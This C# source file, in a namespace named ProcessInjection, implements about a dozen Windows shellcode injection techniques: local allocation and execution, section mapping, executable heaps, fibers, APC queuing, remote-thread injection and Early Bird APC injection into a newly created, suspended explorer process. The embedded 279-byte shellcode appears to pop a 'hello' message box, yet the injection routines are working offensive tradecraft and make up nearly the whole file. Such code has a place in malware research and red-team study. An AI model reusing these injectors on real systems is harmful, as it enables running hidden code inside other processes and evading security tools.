using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ProcessInjection
{
    internal class Program
    {
        static void Main(string[] args)
        {

            byte[] MsgBox =new byte[279] {
0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
0x85,0x04,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x65,0x6c,
0x6c,0x6f,0x00,0x68,0x65,0x6c,0x6c,0x6f,0x00 };
            InjectUnsafe(ref MsgBox);
            remoteApcSuspneded(ref MsgBox,"explorer");
        }

        static void Inject(ref byte[] shellcode) 
        {

            //Allocating Memory with ExecuteReadWrite
            IntPtr hAllocated = Native.VirtualAlloc(IntPtr.Zero, ((uint)shellcode.Length), Native.Commit, Native.ExecuteReadWrite);

            //Writing The Shellcode
            Marshal.Copy(shellcode,0, hAllocated, shellcode.Length);

            //Executing The shellcode

            Marshal.GetDelegateForFunctionPointer<Action>(hAllocated)();


            //another way to execute the shellcode 
            //Native.CreateThread(IntPtr.Zero,0,hAllocated,IntPtr.Zero,0,IntPtr.Zero);
        }
        static unsafe void InjectUnsafe(ref byte[] shellcode) 
        {
            byte[] bytes = shellcode;
            fixed (byte* pointer = bytes) 
            {
                IntPtr memoryAddress = (IntPtr)pointer;
                Native.VirtualProtect(memoryAddress,((uint)shellcode.Length),Native.ExecuteReadWrite,out _);
                Marshal.GetDelegateForFunctionPointer<Action>(memoryAddress)();
            }
        }
        static void InjectCreateSection(ref byte[] shellcode)
        {
            IntPtr hSectionHandle= IntPtr.Zero;
            uint size = (uint)shellcode.Length;
            uint result = Native.NtCreateSection(ref hSectionHandle, Native.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, Native.ExecuteReadWrite, Native.SEC_COMMIT, IntPtr.Zero);
            if (result != 0)
            {
                Console.WriteLine("[!] Unable to create section: {0}");
                return;
            }
            IntPtr pLocalView = IntPtr.Zero;
            ulong offset = 0;
            const uint ViewUnmap = 0x2;
            result = Native.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, out offset, out size, ViewUnmap, 0, Native.ExecuteReadWrite);

            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            if (result != 0)
            {
                Console.WriteLine("[!] Unable to map view of section: {0}");
                return;
            }
            Marshal.GetDelegateForFunctionPointer<Action>(pLocalView)();
        }
        static void InjectHeap(ref byte[] shellcode)
        {

            IntPtr hHeap = Native.HeapCreate(Native.HEAP_CREATE_ENABLE_EXECUTE,0,0);


            //Allocating Memory with ExecuteReadWrite
            IntPtr hAllocated = Native.HeapAlloc(hHeap,0,((uint)shellcode.Length));

            //Writing The Shellcode
            Marshal.Copy(shellcode, 0, hAllocated, shellcode.Length);

            //Executing The shellcode
            Marshal.GetDelegateForFunctionPointer<Action>(hAllocated)();

            //another way to execute the shellcode 
            //Native.CreateThread(IntPtr.Zero,0,hAllocated,IntPtr.Zero,0,IntPtr.Zero);
        }
        static void InjectFiber(ref byte[] shellcode) 
        {

            Native.ConvertThreadToFiber(IntPtr.Zero);

            IntPtr hAllocated = Native.VirtualAlloc(IntPtr.Zero, ((uint)shellcode.Length), Native.Commit, Native.ExecuteReadWrite);

            Marshal.Copy(shellcode, 0, hAllocated, shellcode.Length);

            IntPtr shellcodeFiber = Native.CreateFiber(0, hAllocated, IntPtr.Zero);

            Native.SwitchToFiber(shellcodeFiber);

        }
        static void InjectApc(ref byte[] shellcode) 
        {
            IntPtr hAllocated = Native.VirtualAlloc(IntPtr.Zero, ((uint)shellcode.Length), Native.Commit, Native.ExecuteReadWrite);
            Marshal.Copy(shellcode, 0, hAllocated, shellcode.Length);
            //CLR sets the thread into alertable state when exiting so we don't need to use sleepex
            Native.QueueUserAPC(hAllocated,Native.GetCurrentThread(),IntPtr.Zero);
        }

        static void remoteInject(ref byte[] shellcode,string Processname) 
        {
            Process p = Process.GetProcessesByName(Processname)[0];
            //Allocting with ExecuteReadWrite
            IntPtr hAllocated = Native.VirtualAllocEx(p.Handle, IntPtr.Zero, ((uint)shellcode.Length), Native.Commit, Native.ExecuteReadWrite);

            //Writing Shellcode to targted process 
            Native.WriteProcessMemory(p.Handle,hAllocated,shellcode,shellcode.Length,out IntPtr written);

            //Executing 
            Native.CreateRemoteThread(p.Handle,IntPtr.Zero,0,hAllocated,IntPtr.Zero,0,out _);
        }
        static void remoteCreateSection(ref byte[] shellcode, string Processname)
        {
            Process p = Process.GetProcessesByName(Processname)[0];

            IntPtr hSectionHandle = IntPtr.Zero;
            uint size = (uint)shellcode.Length;


            uint result = Native.NtCreateSection(ref hSectionHandle, Native.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, Native.ExecuteReadWrite, Native.SEC_COMMIT, IntPtr.Zero);
            if (result != 0)
            {
                Console.WriteLine("[!] Unable to create section: {0}");
                return;
            }
            IntPtr pLocalView = IntPtr.Zero;
            ulong offset = 0;
            const uint ViewUnmap = 0x2;
            result = Native.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, out offset, out size, ViewUnmap, 0, Native.ExecuteReadWrite);

            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            if (result != 0)
            {
                Console.WriteLine("[!] Unable to map view of section: {0}");
                return;
            }
            IntPtr pRemoteView = IntPtr.Zero;
            result = Native.NtMapViewOfSection(hSectionHandle, p.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, out offset, out size, ViewUnmap, 0, Native.ExecuteReadWrite);


            //Executing 
            //Native.CreateRemoteThread(p.Handle, IntPtr.Zero, 0, pRemoteView, IntPtr.Zero, 0, out _);


            //or using 
            IntPtr hThread= IntPtr.Zero;
            Native.RtlCreateUserThread(p.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, IntPtr.Zero);

        }
        static void remoteApcBird(ref byte[] shellcode, string Processname) 
        {
            Process p = Process.GetProcessesByName(Processname)[0];
            IntPtr hAllocated = Native.VirtualAllocEx(p.Handle, IntPtr.Zero, ((uint)shellcode.Length), Native.Commit, Native.ExecuteReadWrite);
            Native.WriteProcessMemory(p.Handle, hAllocated, shellcode, shellcode.Length, out IntPtr written);
            // Iterate over threads and queueapc
            foreach (ProcessThread thread in p.Threads)
            {
                //Get handle to thread
                IntPtr tHandle = Native.OpenThread(Native.SUSPEND_RESUME|Native.GET_CONTEXT| Native.SET_CONTEXT, false, (int)thread.Id);

                //Assign APC to thread to execute shellcode
                IntPtr ptr = Native.QueueUserAPC(hAllocated, tHandle, IntPtr.Zero);
            }
        }
        static void remoteApcSuspneded(ref byte[] shellcode, string Processname) 
        {
            byte[] si = new byte[104]; //104 size of startupinfo struct
            byte[] pi = new byte[24];//104 size of processinfo struct

            Native.CreateProcess(null,Processname,IntPtr.Zero,IntPtr.Zero,false,Native.CREATE_SUSPENDED,IntPtr.Zero,null,si,pi);

            //read pi
            IntPtr hProcess = (IntPtr)BitConverter.ToInt64(pi,0);
            IntPtr hThread = (IntPtr)BitConverter.ToInt64(pi, 8);
            int dwThreadId = (int)BitConverter.ToInt32(pi ,pi.Length - 4);
            IntPtr hAllocated = Native.VirtualAllocEx(hProcess, IntPtr.Zero, ((uint)shellcode.Length), Native.Commit, Native.ExecuteReadWrite);
            Native.WriteProcessMemory(hProcess, hAllocated, shellcode, shellcode.Length, out IntPtr written);

            IntPtr threadHandle = Native.OpenThread(Native.SET_CONTEXT, false, dwThreadId);
            // Assign address of shellcode to the target thread apc queue
            Native.QueueUserAPC(hAllocated, threadHandle, IntPtr.Zero);

            Native.ResumeThread(hThread);
        }
    }


}
